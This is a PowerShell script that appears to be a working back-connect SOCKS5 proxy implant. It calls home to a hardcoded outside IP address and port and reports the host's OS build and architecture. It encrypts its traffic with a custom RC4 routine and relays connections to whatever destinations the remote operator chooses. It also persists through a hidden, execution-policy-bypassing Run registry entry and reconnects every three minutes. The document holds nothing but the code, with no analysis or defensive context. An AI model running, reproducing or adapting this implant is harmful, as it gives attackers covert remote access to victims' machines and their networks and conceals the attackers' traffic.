$_host = '185.158.155.175'

$_port = 4201

$xordata = New-Object byte[] 50

For ($i=0; $i -ne 50; $i++) { $xordata[$i] =  $i }

Function Rc4_crypt($Pass, [int]$LenPass, $iData, $index, $LenData)
{

	$rc4keytable = New-Object byte[] 256
	
	[int]$ecx = 0
	
	[int]$eax = 0
	
	[int]$ebx = 0
	
	[int]$esi = 0
	
	[int]$edi = 0
	
	[int]$al = 0
	
	[int]$dh = 0
	
	[int]$dl = 0
	
	[int]$cl = 0
	
	[int]$t = 0
	
	[int]$goto0 = 0
	
	For ($i=0; $i -le 255; $i++) { $rc4keytable[$i] =  $i }
	
	do
	{
		 if ($goto0 -eq 0)
		 {
			 $ebx = 0

			 $esi = $LenPass
		 }

		 if ($goto0 -ne 0)
		 {
			 $goto0 = 0

			 $ebx++

			 if (--$esi -eq 0)
			 {
				 continue
			 }
			 
		 }
		 
		 $dl = $rc4keytable[$ecx]

		 $t = $Pass[$ebx] -as[int]

		 $eax += $t

		 $eax = $eax -band 255

		 $eax += $dl

		 $eax = $eax -band 255

		 $dh = $rc4keytable[$eax]
		 
		 $rc4keytable[$ecx] = $dh

		 $rc4keytable[$eax] = $dl

		 $ecx++

		 $ecx = $ecx -band 255

		 if ($ecx -ne 0)
		 {
			 $goto0 = 1
			 
			 continue
		 }

		 $edi = $LenData

		 $eax = 0

		 $ecx = 0

		 $ebx = 0

		 $esi = 0
		 
		 do
		 {
			 $ebx++

			 $ebx = $ebx -band 255

			 $dl = $rc4keytable[$ebx]
			 
			 $eax += $dl

			 $eax = $eax -band 255

			 $cl = $rc4keytable[$eax]

			 $rc4keytable[$ebx] = $cl

			 $rc4keytable[$eax] = $dl

			 $cl += $dl
	
			 $cl = $cl -band 255

			 $ecx = $rc4keytable[$cl]
			 
			 $al = $iData[$index + $esi]

			 $al = $al -bxor $ecx
			 
			 $iData[$index + $esi] = $al -as [byte]

			 $esi++
			 
			 if (--$edi -eq 0)
			 {
				 break
			 }
		 }
		 
		 while($true)
		 
		 break
	}
	
	while($true)
}

$new_connection={
	
	 Param
	 (
		 $stream,
		 $writer,
		 $reader,
		 $SocketArray,
		 $ebx,
		 $domain,
		 $port_,
		 $xordata_,
		 $Rc4_crypt
	 )
	 
	 Function Rc4_crypt2($Pass, [int]$LenPass, $iData, $index, $LenData)
	 {

		 $rc4keytable = New-Object byte[] 256
	
		 [int]$ecx = 0
	
		 [int]$eax = 0
	
		 [int]$ebx = 0
	
		 [int]$esi = 0
	
		 [int]$edi = 0
	
		 [int]$al = 0
	
		 [int]$dh = 0
	
		 [int]$dl = 0
	
		 [int]$cl = 0
	
		 [int]$t = 0
	
		 [int]$goto0 = 0
	
		 For ($i=0; $i -le 255; $i++) { $rc4keytable[$i] =  $i }
	
		 do
		 {
			 if ($goto0 -eq 0)
			 {
				 $ebx = 0

				 $esi = $LenPass
			 }

			 if ($goto0 -ne 0)
			 {
				 $goto0 = 0

				 $ebx++

				 if (--$esi -eq 0)
				 {
					 continue
				 }
			 
			 }
		 
			 $dl = $rc4keytable[$ecx]

			 $t = $Pass[$ebx] -as[int]

			 $eax += $t

			 $eax = $eax -band 255

			 $eax += $dl

			 $eax = $eax -band 255

			 $dh = $rc4keytable[$eax]
		 
			 $rc4keytable[$ecx] = $dh

			 $rc4keytable[$eax] = $dl

			 $ecx++

			 $ecx = $ecx -band 255

			 if ($ecx -ne 0)
			 {
				 $goto0 = 1
			 
				 continue
			 }

			 $edi = $LenData

			 $eax = 0

			 $ecx = 0

			 $ebx = 0

			 $esi = 0
		 
			 do
			 {
				 $ebx++

				 $ebx = $ebx -band 255

				 $dl = $rc4keytable[$ebx]
			 
				 $eax += $dl

				 $eax = $eax -band 255

				 $cl = $rc4keytable[$eax]

				 $rc4keytable[$ebx] = $cl

				 $rc4keytable[$eax] = $dl

				 $cl += $dl
	
				 $cl = $cl -band 255

				 $ecx = $rc4keytable[$cl]
			 
				 $al = $iData[$index + $esi]

				 $al = $al -bxor $ecx
			 
				 $iData[$index + $esi] = $al -as [byte]

				 $esi++
			 
				 if (--$edi -eq 0)
				 {
					 break
				 }
			 }
		 
			 while($true)
		 
			 break
		 }
	
		 while($true)
	 }
	 
	 [int]$trash = 0
	 
	 $cSocket = $null
	 
	 $buffer = New-Object byte[] 65536
	 
	 $responce = New-Object byte[] 13
	 
	 For ($i=0; $i -ne 13; $i++) { $responce[$i] = 0x00 }
	 
	 $responce[0] = $ebx -as [byte]
	 
	 $responce[1]  = 0x0A
	 $responce[3]  = 0x05
	 $responce[6]  = 0x01

	 try
	 {
		 $_timeout = 1

		 $SocketArray[$ebx] = New-Object System.Net.Sockets.TcpClient( $domain, $port_)
		 
		 $cSocket = $SocketArray[$ebx];
	 
		 $SocketArray[$ebx].NoDelay = $true
	 
		 $SocketArray[$ebx].ReceiveTimeout = $_timeout * 1000
	 
		 $stream[$ebx] = $SocketArray[$ebx].GetStream()
	 
		 $reader[$ebx] = New-Object System.IO.BinaryReader($stream[$ebx])
	 
		 $writer[$ebx] = New-Object System.IO.BinaryWriter($stream[$ebx])
		 
		 Rc4_crypt2 $xordata_ 50 $responce 0 3
		 Rc4_crypt2 $xordata_ 50 $responce 3 10
		 
		 $writer[0].Write($responce, 0, 13)
		 $writer[0].Flush()
	 }
	 
	 catch
	 
	 {
		 #$SocketArray[$ebx] = $null
		 
		 $responce[4] = 0x01
		 
		 Rc4_crypt2 $xordata_ 50 $responce 0 3
		 Rc4_crypt2 $xordata_ 50 $responce 3 10
		 
		 $writer[0].Write($responce, 0, 13)
		 $writer[0].Flush()
	 }
		 
	 try
	 {
		 do
		 {
			 try
		 
			 {
				 $Start = Get-Date
				 
				 $rc = $reader[$ebx].Read($buffer, 3, 65530)
				  
				 if ($rc -eq 0) { break }
				 
			  }
			  
			 catch
			 
			 {
				 $End = Get-Date
				 
				 $Time = $End - $Start
				 
				 if ($Time.Seconds -ge $_timeout)
				 {
					 continue
				 }
				 
				 break
			 }
			 
			 $buffer[0] = $ebx -as[byte]
			 
			 $rc0 = $rc -band 0x000000ff
			 $rc1 = [math]::Floor(($rc -band 0x0000ff00) * [math]::Pow(2,-8))
			 
			 $buffer[1] = $rc0 -as[byte]
			 $buffer[2] = $rc1 -as[byte]
			 
			 Rc4_crypt2 $xordata_ 50 $buffer 0 3
			 Rc4_crypt2 $xordata_ 50 $buffer 3 $rc
			 
			 $writer[0].Write($buffer, 0, $rc + 3)
			 $writer[0].Flush()
		 }
		 
		 while($SocketArray[$ebx] -ne $null)
		 
	 }
	 
	 catch
	 
	 {
		 $trash++
	 }
	 
	 #$SocketArray[$ebx] = $null
	 
	 $responce[0] = $ebx -as [byte]
	 $responce[1] = 0x00
	 $responce[2] = 0x00
	 
	 Rc4_crypt2 $xordata_ 50 $responce 0 3
	 
	 $writer[0].Write($responce, 0, 3)
	 $writer[0].Flush()
	 
	 if ($cSocket -ne $null) { $cSocket.Close() }
	 
}

Function bc_connect([string]$_host, [int]$_port)
{
	 $responce = New-Object byte[] 3
	 
	 $SocketArray = @(0) * 200
	 
	 For ($i=0; $i -ne 200; $i++) { $SocketArray[$i] = $null }
	 
	 $stream = @(0) * 200
	 
	 $writer = @(0) * 200
	 
	 $reader = @(0) * 200
	 
	 $_timeout = 120
	 
	 [int]$trash = 0
	 
	 [int]$port_ = 0
	 
	 [string]$domain
	 
	 [int]$eax = 0
	 
	 [int]$ebx = 0
	 
	 [int]$ecx = 0
	 
	 [int]$edx = 0
	 
	 [int]$isExit = 0
	 
	 [int]$rc = 0
	 
	 [int]$_ecx = 0
	 
	 [int]$_edx = 0
	 
	 [int]$remaining = 0
	 
	 [int]$remaining4 = 0
	 
	 [int]$reverse = 0
	 
	 [int]$attempt = 0
	 
	 $jobs = New-Object object[] 200
	 
	 $buffer0 = New-Object byte[] 65536

	 $buffer1 = New-Object byte[] 65536

	 $rbuffer = New-Object byte[] 65536
	 
	 try
	 
	 {
		 $pool = [RunspaceFactory]::CreateRunspacePool(1, 200)
		 $pool.Open()
		 
		 $SocketArray[0] = New-Object System.Net.Sockets.TcpClient( $_host, $_port)
	 
		 $SocketArray[0].NoDelay = $true
	 
		 $SocketArray[0].ReceiveTimeout = $_timeout * 1000
	 
		 $stream[0] = $SocketArray[0].GetStream()
	 
		 $reader[0] = New-Object System.IO.BinaryReader($stream[0])
	 
		 $writer[0] = New-Object System.IO.BinaryWriter($stream[0])
		 
		 For ($i=0; $i -ne 50; $i++) { $buffer0[$i] = $xordata[$i] }
		 
		 For ($i=50; $i -ne 100; $i++) { $buffer0[$i] = 0 }
	 
		 $int64 = 0
	 
		 if ([IntPtr]::Size -eq 8) {$int64 = 1}
		 
		 $buffer0[53] = $int64 -as[byte]
	 
		 $osn = [system.environment]::osversion.version.build
	 
		 $os0 = $osn -band 0x000000ff
		 $os1 = [math]::Floor(($osn -band 0x0000ff00) * [math]::Pow(2,-8))
		 
		 $buffer0[50] = $os0 -as[byte]
		 $buffer0[51] = $os1 -as[byte]
	 
		 $buffer0[54] = 0x50 -as[byte]
		 $buffer0[55] = 0x53 -as[byte]
		 
		 Rc4_crypt $xordata 50 $buffer0 50 50
		 
		 $writer[0].Write($buffer0, 0, 100)
		 $writer[0].Flush()
		 
	 	 while($true)
	 	 {
			 try
		 
		 	 {
			 	 if ($_ecx -eq 0 -and $remaining4 -ne 4)
	 	 	 	 {
				 	 $Start = Get-Date
		 
				 	 $rc = $reader[0].Read($buffer1, 0, 65536)
					 
					 if ($rc -eq 0) { break }
			 	 }
		 	 }
	 
		 	 catch
	 
		 	 {
			 	 $End = Get-Date
				 
				 $Time = $End - $Start
				 
			 	 if ($Time.Seconds -ge $_timeout)
			 	 {
				 	 if ($remaining -ne 0 -or $remaining4 -ne 0) { break }
					 
				 	 continue
			 	 }
				 
			 	 break
		 	 }
			 
		 	 if ($remaining -ne 0 -or $remaining4 -eq 4)
	 	 	 {
			 	 if ($buffer0[2 + 0] -eq 0x00 -as[byte] -and $buffer0[2 + 1] -eq 0x00 -as[byte])
			 	 {
	 	 		 	 if ($buffer0[0] -eq 0xFF -as[byte] -and $buffer0[1] -eq 0xFE -as[byte])
	 	 		 	 {
	 	 			 	 $isExit = 1
						 
	 	 			 	 break
	 	 		 	 }
					 
				 	 $ecx = $buffer0[1]

	 	 		 	 if ($SocketArray[$ecx] -ne $null) { $SocketArray[$ecx] = $null }
	 	 	 	 }
			 
	 	 	 	 else
			 
	 	 	 	 {
	 	 		 	 if ($_ecx -eq 0)
	 	 		 	 {
					 	 if ($rc -eq 0)
					 	 {
						 
						 	 try
						 
						 	 {
							 
							 	 $rc = $reader[0].Read($buffer1, 0, 65536)
								 
								 if ($rc -eq 0) { break }
							 
						 	 }
						 
						 	 catch
						 
						 	 {
								 
							 	 break
							 
						 	 }
						 
					 	 }

					 	 if ($rc -lt 0 -or $rc -eq 0) { break }

					 	 For ($i=0; $i -ne $rc; $i++) { $rbuffer[$i] = $buffer1[$i] }

	 	 			 	 $_ecx = $rc
					 
	 	 			 	 $_edx = 0
					 
					 	 $rc = 0
	 	 		 	 }
				 
	 	 		 	 $edx = $remaining
				 
				 	 $ecx = 256 * $buffer0[2 + 1] + $buffer0[2 + 0]

	 	 		 	 $ecx -= $edx
				 
	 	 		 	 if ($_ecx -le $ecx) { $ecx = $_ecx }
				 
				 	 For ($i=0; $i -ne $ecx; $i++) { $buffer0[$i + $edx + 4] = $rbuffer[$i + $_edx] }
				 
	 	 		 	 $_edx += $ecx
				 
	 	 		 	 $_ecx -= $ecx
				 
	 	 		 	 $remaining += $ecx
					 
				 	 if ((256 * $buffer0[2 + 1] + $buffer0[2 + 0]) -eq $remaining)
	 	 		 	 {
						 $eax = 256 * $buffer0[2 + 1] + $buffer0[2 + 0]

						 Rc4_crypt $xordata 50 $buffer0 4 $eax
					 
	 	 			 	 $ebx = $buffer0[1]
					 
	 	 			 	 if ($buffer0[0] -eq 0xFF -as[byte] -and $buffer0[1] -eq 0xFF -as[byte])
	 	 			 	 {
	 	 				 	 $trash++
					 	 }
					 
	 	 			 	 elseif ($buffer0[0] -eq 0x00 -as[byte])
					 
	 	 			 	 {
						 	 if ($buffer0[4 + 3] -eq 0x03 -as[byte])
						 	 {
							 	 $port_ = 256 * $buffer0[4 + 5 + $buffer0[4 + 4] + 0] + $buffer0[4 + 5 + $buffer0[4 + 4] + 1]
								 
							 	 $fileBytes = New-Object byte[] $buffer0[4 + 4]
								 
							 	 For ($i=0; $i -ne $buffer0[4 + 4] -as[int]; $i++) { $fileBytes[$i] = $buffer0[$i + 4 + 5] }
								 
							 	 [string]$domain = [System.Text.Encoding]::ASCII.GetString($fileBytes)
						 	 }

						 	 elseif ($buffer0[4 + 3] -eq 0x01 -as[byte])

						 	 {
							 	 [int]$a = $buffer0[4 + 4 + 0] -as[int]
							 	 [int]$b = $buffer0[4 + 4 + 1] -as[int]
							 	 [int]$c = $buffer0[4 + 4 + 2] -as[int]
							 	 [int]$d = $buffer0[4 + 4 + 3] -as[int]

							 	 [string]$domain = "{0}.{1}.{2}.{3}" -f $a, $b, $c, $d

							 	 $port_ = 256 * $buffer0[4 + 8 + 0] + $buffer0[4 + 8 + 1]
						 	 }

						 	 else

                         	 {
							 	 [string]$domain = "hooligan"

							 	 $port_ = 0

						 	 }

							 $ps = [PowerShell]::Create()
							 $ps.RunspacePool = $pool

							 [void]$ps.AddScript($new_connection)
		
							 [void]$ps.AddParameter("stream", $stream)
							 [void]$ps.AddParameter("writer", $writer)
							 [void]$ps.AddParameter("reader", $reader)
							 [void]$ps.AddParameter("SocketArray", $SocketArray)
							 [void]$ps.AddParameter("ebx", $ebx)
							 [void]$ps.AddParameter("domain", $domain)
							 [void]$ps.AddParameter("port_", $port_)
							 [void]$ps.AddParameter("xordata_", $xordata)
							 [void]$ps.AddParameter("Rc4_crypt", $Rc4_crypt)
		
							 $jobs[$i] = [PSCustomObject]@{
								 PowerShell = $ps
								 AsyncResult = $ps.BeginInvoke()
							 }
							 
						 }
					 
	 	 			 	 else
					 
	 	 			 	 {
						 	 try
						 
						 	 {
						 
							 	 $writer[$ebx].Write($buffer0, 4, $eax)
							 	 $writer[$ebx].Flush()
							 
						 	 }
						 
						 	 catch
						 
						 	 {
							 
							 	 $trash++
							 
						 	 }
	 	 			 	 }
					 
	 	 			 	 $remaining = 0
	 	 		 	 }
	 	 	 	 }
	 	 			 
	 	 	 	 $remaining4 = 0

	 	 	 }
	 	 		 
	 	 	 else 
	 	 		
	 	 	 {
	 	 	 	 if ($_ecx -eq 0)
	 	 	 	 {
				 	 if ($rc -eq 0)
				 	 {
					 
					 	 try
					 
					 	 {
						 
						 	 $rc = $reader[0].Read($buffer1, 0, 65536)
							 
							 if ($rc -eq 0) { break }
							 
					 	 }
					 
					 	 catch
					 
					 	 {
							 
						 	 break
						
					 	 }
					
				 	 }
					 

				 	 if ($rc -lt 0 -or $rc -eq 0) { break }
					 
				 	 For ($i=0; $i -ne $rc; $i++) { $rbuffer[$i] = $buffer1[$i] }
				 
				 	 $_ecx = $rc
				 
				 	 $_edx = 0
				 
				 	 $rc = 0
	 	 	 	 }
			 
	 	 	 	 $ecx = $remaining4
			 
	 	 	 	 $edx = 4
			 
	 	 	 	 $edx -= $remaining4
			 
	 	 	 	 if ($_ecx -lt $edx) { $edx = $_ecx }
			 
			 	 For ($i=0; $i -ne $edx; $i++) { $buffer0[$i + $ecx] = $rbuffer[$i + $_edx] }
			 
	 	 	 	 $_edx += $edx
			 
	 	 	 	 $_ecx -= $edx
			 
	 	 	 	 $remaining4 += $edx
			 
	 	 	 	 if ($remaining4 -eq 4) { Rc4_crypt $xordata 50 $buffer0 0 4 }
	 	 	 }
	 	 }
	 
	 	 if ($isExit -eq 1)
	 	 {
		 	 Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks5_powershell"

		 	 [Environment]::Exit(0)
		 }
		 
		 throw "close"
	 
	 }
	 
	 catch
	 {
		 $message = $_
		 Write-Warning "Something happened! $message"
		 
		 $pool.Dispose()
		 
		 if ($SocketArray[0] -ne $null) { $SocketArray[0].Close() }
	 }
}

try
{
	 Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "socks5_powershell" -Value "Powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""

}

catch { }

while($true)
{
	 bc_connect $_host $_port
	 
	 Start-Sleep -s 180
}